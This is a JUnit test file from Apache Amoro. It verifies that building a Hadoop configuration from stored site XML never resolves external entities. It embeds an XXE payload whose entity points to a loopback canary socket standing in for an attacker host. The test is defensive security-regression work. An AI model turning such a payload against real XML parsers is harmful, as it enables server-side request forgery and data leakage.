/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.apache.amoro.table;

import static org.junit.jupiter.api.Assertions.assertThrows;

import org.junit.jupiter.api.Test;

import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.SocketTimeoutException;
import java.nio.charset.StandardCharsets;

public class TestTableMetaStoreXxeHardening {

  /**
   * Site XML stored in the database may predate upload validation and carry an external entity.
   * Building the Hadoop configuration from it must never resolve that entity: a listening socket
   * stands in for the attacker host and fails the test if the server connects out.
   */
  @Test
  void buildingConfigurationFromSiteXmlWithExternalEntityNeverConnectsOut() throws Exception {
    try (ServerSocket canary = new ServerSocket(0, 1, InetAddress.getLoopbackAddress())) {
      String xxe =
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
              + "<!DOCTYPE data [<!ENTITY ssrf SYSTEM \"http://127.0.0.1:"
              + canary.getLocalPort()
              + "/leak\">]>"
              + "<data>&ssrf;</data>";
      TableMetaStore metaStore =
          TableMetaStore.builder().withCoreSite(xxe.getBytes(StandardCharsets.UTF_8)).build();
      try {
        metaStore.getConfiguration();
      } catch (RuntimeException allowed) {
        // restricted parsing may reject the document outright; either way no connection is made
      }
      canary.setSoTimeout(1500);
      assertThrows(SocketTimeoutException.class, canary::accept);
    }
  }
}
